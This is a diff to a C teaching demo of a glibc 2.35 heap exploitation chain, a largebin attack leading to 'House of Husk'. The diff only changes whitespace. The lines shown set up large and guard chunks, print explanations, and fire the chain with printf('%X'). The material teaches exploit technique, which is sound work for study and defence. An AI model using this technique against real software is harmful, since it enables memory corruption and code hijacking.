@@ -47,14 +47,14 @@ int main(void)
   printf("For the 1st Largebin Attack, we allocate a large 0x%lx chunk [p1] (%p)\n", p1[-1], p1-2);
   printf(" Note: [p1] refers to the chunk itself; 'p1' points to its user data region, not the metadata\n");
   printf(" We will use this same convention for the following demonstratation\n");
-  size_t *g1 = malloc(0x18);	// Guard chunk
+  size_t *g1 = malloc(0x18);  // Guard chunk
 
   printf("\n");
 
   size_t *p2 = malloc(0x418);
   printf("We also allocate a second large 0x%lx chunk [p2] (%p).\n", p2[-1], p2-2);
   printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
-  size_t *g2 = malloc(0x18); 	// Guard chunk
+  size_t *g2 = malloc(0x18);   // Guard chunk
 
   printf("\n");
 
@@ -62,10 +62,10 @@ int main(void)
   printf("And put them into a different large bin\n");
   size_t *p3 = malloc(0x488);
   printf("The larger one is the 0x%lx [p3] (%p)\n", p3[-1], p3-2);
-  size_t *g3 = malloc(0x18);	// Guard chunk
+  size_t *g3 = malloc(0x18);  // Guard chunk
   size_t *p4 = malloc(0x478);
   printf("The smaller one is the 0x%lx [p4] (%p)\n", p4[-1], p4-2);
-  size_t *g4 = malloc(0x18);	// Guard chunk
+  size_t *g4 = malloc(0x18);  // Guard chunk
 
   printf("\n");
 
@@ -191,7 +191,7 @@ int main(void)
   printf("\n");
 
   puts("[*] Setup complete for House of Husk (Attack Chain 2) in glibc-2.35");
-  puts("	 Press ENTER to trigger...");
+  puts("   Press ENTER to trigger...");
   getchar();
   printf("%X", 0);  // Triggers backdoor if successful
 
